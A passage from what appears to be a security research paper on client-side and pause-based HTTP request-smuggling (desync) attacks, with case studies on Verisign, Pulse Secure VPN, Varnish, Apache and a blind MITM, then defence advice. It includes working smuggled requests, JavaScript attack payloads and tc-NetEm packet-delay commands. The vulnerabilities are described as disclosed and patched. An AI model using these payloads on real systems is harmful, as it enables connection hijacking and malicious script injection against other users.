This would be near useless in a server-side desync, but since the victim's browser is under my control I can accurately
predict the size of the next request, and consume it in a single chunk:
POST /%2f HTTP/1.1 
Host: www.verisign.com 
Content-Length: 81 
HEAD / HTTP/1.1 
Connection: keep-alive 
Transfer-Encoding: chunked 
34d 
POST / HTTP/1.1 
Host: www.verisign.com 
Content-Length: 59 
0 
GET /evil() HTTP/1.1 
Host: www.verisign.com 
HTTP/1.1 200 OK 
HTTP/1.1 200 OK 
Content-Type: text/html 
Content-Length: 54873 
HTTP/1.1 301 Moved Permanently 
Location: /en_US/?
evil()/index.xhtml 
This attack was triggered using the following JavaScript:
fetch('https://www.verisign.com/%2f', {  
    method: 'POST', 
    body: `HEAD /assets/languagefiles/AZE.html HTTP/1.1\r\nHost:
www.verisign.com\r\nConnection: keep-alive\r\nTransfer-Encoding:
chunked\r\n\r\n34d\r\nx`,  
    credentials: 'include', 
    headers: {'Content-Type': 'application/x-www-form-urlencoded' 
}}).catch(() => { 
    let form = document.createElement('form') 
    form.method = 'POST' 
    form.action = 'https://www.verisign.com/robots.txt' 
    form.enctype = 'text/plain' 
    let input = document.createElement('input') 
    input.name = '0\r\n\r\nGET / HTTP/1.1\r\nHost:
www.verisign.com\r\n\r\nGET /?aaaaaaaaaaaaaaa HTTP/1.1\r\nHost:
www.verisign.com\r\n\r\n' 
    input.value = '' 
    form.appendChild(input) 
    document.body.appendChild(form) 
    form.submit() 
}
This was reported on 2021-12-22 and, after a false-start, successfully patched on 2022-07-21.
Pulse Secure VPN
For our ﬁnal study, we'll target Pulse Secure VPN which ignores the Content-Length on POST requests to static ﬁles like
/robots.txt. Just like Cisco Web VPN, this target has a host-header redirect gadget which I'll use to hijack a JavaScript
import. However, this time the redirect isn't cacheable, so client-side cache poisoning isn't an option.
Since we're targeting a resource load and don't have the luxury of poisoning the client-side cache, the timing of our attack
is crucial. We need the victim's browser to successfully load a page on the target site, but then use a poisoned connection
to load a JavaScript subresource.
The inherent race condition makes this attack unreliable, so it's doomed to fail if we only have a single attempt - we need
to engineer an environment where we get multiple attempts. To achieve this, I'll create a separate window and keep a
handle on it from the attacker page.
On most target pages, a failed attempt to hijack a JS import will result in the browser caching the genuine JavaScript ﬁle,
leaving that page immune to such attacks until the cached JS expires. I was able to avoid this problem by targeting /dana-
na/meeting/meeting_testjs.cgi which loads JavaScript from /dana-na/meeting/url_meeting/appletRedirect.js - which
doesn't actually exist, so it returns a 404 and doesn't get saved in the browser's cache. I also padded the injected request
with a lengthy header to mitigate the stacked-response problem.
This results in the following attack ﬂow:
1. Open a new window.
2. Issue a harmless request to the target to establish a fresh connection, making timings more consistent.
3. Navigate the window to the target page at /meeting_testjs.cgi.
4. 120ms later, create three poisoned connections using the redirect gadget.
5. 5ms later, while rendering /meeting_testjs.cgi the victim will hopefully attempt to import /appletRedirect.js and get
redirected to x.psres.net, which serves up malicious JS.
6. If not, retry the attack.
Here's the ﬁnal attack script:
Start attack
This was reported on 2022-01-24 and hopefully patched by the time you're reading this.
Pause-based desync
We saw earlier that pausing in the middle of an HTTP request and observing the server's reaction can reveal useful
information that can't be obtained by tampering with the actual content of a request. As it turns out, pausing can also
create new desync vulnerabilities by triggering misguided request-timeout implementations.
This vulnerability class is invisible unless your tool has a higher timeout than the target server. I was extremely lucky to
discover it, as my tool was supposed to have a 2-second timeout but, due to a bug, it reverted to a 10-second timeout. My
pipeline also happened to include a lone site that was running Varnish conﬁgured with a custom 5-second timeout.
Varnish
Varnish cache has a feature called synth(), which lets you issue a response without forwarding the request to the back-
end. Here's an example rule being used to block access to a folder:
if (req.url ~ "^/admin") { 
    return (synth(403, "Forbidden")); 
} 
When processing a partial request that matches a synth rule, Varnish will time out if it receives no data for 15 seconds.
When this happens, it leaves the connection open for reuse even though it has only read half the request off the socket.
This means that if the client follows up with the second half of the HTTP request, it will be interpreted as a fresh request.
To trigger a pause-based desync on a vulnerable front-end, start by sending your headers, promising a body, and then just
wait. Eventually you'll receive a response and when you ﬁnally send send your request body, it'll be interpreted as a new
request:
Apache
After this discovery, I bumped Turbo Intruder's request timeout and discovered that the same technique works on
Apache. Just like Varnish, it's vulnerable on endpoints where the server generates the response itself rather than letting
the application handle the request. One way this happens is with server-level redirects:
Redirect 301 / /en
If you spot a server that's vulnerable to a pause-based desync, you've got two options for exploitation depending on
whether it's the front-end or back-end.
Server-side
If the vulnerable server is running on the back-end, you may be able to trigger a server-side desync. For this to work, you
need a front-end that will stream requests to the back-end. In particular, it needs to forward along HTTP headers without
buffering the entire request body. This is what the resulting exploit ﬂow will look like:
There's one small catch here. The front-end won't read in the timeout response and pass it along to us until it's seen us
send a complete request. As a result, we need to send our headers, pause for a while then continue unprompted with the
rest of the attack sequence. I'm not aware of any security testing tools that support partially delaying a request like this,
so I've implemented support into Turbo Intruder. The queue interface now has three new arguments:
pauseBefore speciﬁes an offset at which Turbo should pause.
pauseMarker is an alternative which takes a list of strings that Turbo should pause after issuing
pauseTime speciﬁes how long to pause for, in microseconds
So, which front-ends actually have this request-streaming behaviour? One well-known front-end is Amazon's
Application Load Balancer (ALB), but there's an extra snag. If ALB receives a response to a partial request, it will refuse
to reuse the connection.
Fortunately, there's an inherent race condition in this mechanism. You can exploit Varnish behind ALB by delaying the
second half of the request just enough that it arrives on the front-end at the same moment the back-end times out.
Matching timeouts
There's an additional complication when it comes to exploiting Apache behind ALB - both servers have a default timeout
of 60 seconds. This leaves an extremely small time-window to send the second part of the request.
I attempted to solve this by sending some data that got normalised away by the front-end, in order to reset the timer on
the front-end without affecting the back-end timer. Unfortunately, neither chunk size padding, chunk extensions, or TCP
duplicate/out-of-order packets achieved this goal.
In the end, to prove the concept, I banked on pure chance and launched a slow but sustained attack using Turbo Intruder.
This was ultimately successful after 66 hours.
MITM-powered
As pause-based desync attacks use legitimate HTTP requests, it's natural to wonder whether they can be used to trigger a
client-side desync. I explored options to make browsers pause halfway through issuing a request, but although Streaming
Fetch19 sounded promising, it's not yet implemented and, ultimately, I wasn't successful.
However, there's one approach that can deﬁnitely delay a browser request - an active MITM attack. TLS is designed to
prevent data from being decrypted or modiﬁed in-ﬂight, but it's bundled over TCP, and there's nothing to stop attackers
delaying entire packets. This could be referred to as a blind MITM attack, as it doesn't rely on decrypting any trafﬁc.
The attack ﬂow is very similar to a regular client-side desync attack. The user visits an attacker-controlled page, which
issues a series of cross-domain requests to the target application. The ﬁrst HTTP request is deliberately padded to be so
large that the operating system splits it into multiple TCP packets, enabling an active MITM to delay the ﬁnal packet,
triggering a pause-based desync. Due to the padding, the attacker can identify which packet to pause simply based on the
size.
I was able to successfully perform this attack against a standalone Apache-based website with the default conﬁguration
and a single redirect rule:
Redirect 301 /redirect /destination
From the client-side it looks like a regular client-side desync using the HEAD gadget, aside from the request padding:
let form = document.createElement('form') 
form.method = 'POST' 
form.enctype = 'text/plain' 
form.action = 'https://x.psres.net:6082/redirect?'+"h".repeat(600)+
Date.now() 
let input = document.createElement('input') 
input.name = "HEAD / HTTP/1.1\r\nHost: x\r\n\r\nGET /redirect?
 HTTP/1.1\r\nHost: x\r\nFoo:
bar"+"\r\n\r\n".repeat(1700)+"x" 
input.value = "x" 
form.append(input) 
document.body.appendChild(form) 
form.submit()
On the attacker system performing the blind MITM, I implemented the delay using tc-NetEm:
# Setup 
tc qdisc add dev eth0 root handle 1: prio priomap 
# Flag packets to 34.255.5.242 that are between 700 and 1300 bytes 
tc filter add dev eth0 protocol ip parent 1:0 prio 1 basic \ 
match 'u32(u32 0x22ff05f2 0xffffffff at 16)' \ 
and 'cmp(u16 at 2 layer network gt 0x02bc)' \ 
and 'cmp(u16 at 2 layer network lt 0x0514)' \ 
flowid 1:3 
# Delay flagged packets by 61 seconds 
tc qdisc add dev eth0 parent 1:3 handle 10: netem delay 61s
By massaging the request-padding and the packet-size ﬁlter, I achieved around 90% success rate on the target browser.
I reported the Varnish vulnerability on the 17th December, and it was patched on the 25th January as CVE-2022-2395920.
The Akamai vulnerability was reported on the same day, and patched on the 14th March as CVE-2022-2272021
Conclusion
Further research
The topics and techniques covered in this paper have signiﬁcant potential for further research. A few nice-to-haves that
stand out to me are:
New ways of triggering a client-side desync with a browser-issuable request
An efﬁcient and reliable way of detecting pause-based server-side desync vulnerabilities
More exploitation gadgets for client-side desync attacks
Real world PoCs using CSD-chaining
A way to delay a browser request with needing a MITM
A way to force browsers to use HTTP/1 when HTPT/2 is available
Exploration of equivalent attacks on HTTP/2+
It's likely that this list has some major omissions too.
Defence
You can mitigate most of the attacks described in this paper by using HTTP/2 end to end. Equivalent ﬂaws in HTTP/2 are
possible, but signiﬁcantly less likely. I don't recommend having a front-end that supports HTTP/2 but then rewrites
requests to HTTP/1.1 to talk to the back-end. This does mitigate client-side desync attacks, but it fails to mitigate server-
side pause-based attacks and also introduces additional threats.
If your company routes employee's trafﬁc through a forward proxy, ensure upstream HTTP/2 is supported and enabled.
Please note that the use of forward proxies also introduces a range of extra request-smuggling risks beyond the scope of
this paper.
The plaintext nature of HTTP/1.1 makes it look deceptively simple, and tempts developers into implementing their own
server. Unfortunately, even a minimalistic implementation of HTTP/1.1 is prone to serious vulnerabilities, especially if it
supports connection-reuse or gets deployed behind a separate front-end. I regard implementing your own HTTP server as
equivalent to rolling your own crypto - usually a bad idea.
Of course, some things are inevitable. If you ﬁnd yourself implementing an HTTP server:
Treat HTTP requests as individual entities - don't assume two requests sent down the same connection have
anything in common.
Either fully support chunked encoding, or reject it and reset the connection.
Never assume a request won't have a body.
Default to discarding the connection if you encounter any server-level exceptions while handling a request.
Support HTTP/2.
Summary
I've introduced client-side desync and pause-based desync, and provided a toolkit, case-studies and methodology for
understanding the threat they pose. This has demonstrated that desync attacks can't be completely avoided by blocking
obfuscated or malformed requests, hiding on an internal network, or not having a front-end. We've also learned that
early-reads are an invaluable tool for comprehending and exploiting black-box deployments. Finally, I've hopefully
demonstrated that custom HTTP servers are something to be avoided.
References
1. https://twitter.com/PortSwigger/status/1499776690746241030
2. https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
3. https://portswigger.net/research/http2
4. https://portswigger.net/web-security/request-smuggling/browser
5. https://github.com/PortSwigger/http-request-smuggler
6. https://github.com/PortSwigger/turbo-intruder
7. https://portswigger.net/research/browser-powered-desync-attacks
8. https://portswigger.net/web-security/host-header
9. https://youtu.be/gAnDUoq1NzQ?t=1327
10. https://www.youtube.com/watch?t=249&v=vCpIAsxESFY
11. https://campus.barracuda.com/product/loadbalanceradc/doc/95257522/release-notes-version-6-5/
12. https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-
New-Defenses-And-New-Challenges.pdf
13. https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests
14. https://www.chromium.org/developers/design-documents/network-stack/preconnect
15. https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests
16. https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-
an-on-site-redirect-into-an-open-redirect
17. https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling#non-blind-request-
tunnelling-using-head
18. https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asa-webvpn-LOeKsNmO
19. https://web.dev/fetch-upload-streaming/
20. https://varnish-cache.org/security/VSV00008.html
21. https://httpd.apache.org/security/vulnerabilities_24.html#CVE-2022-22720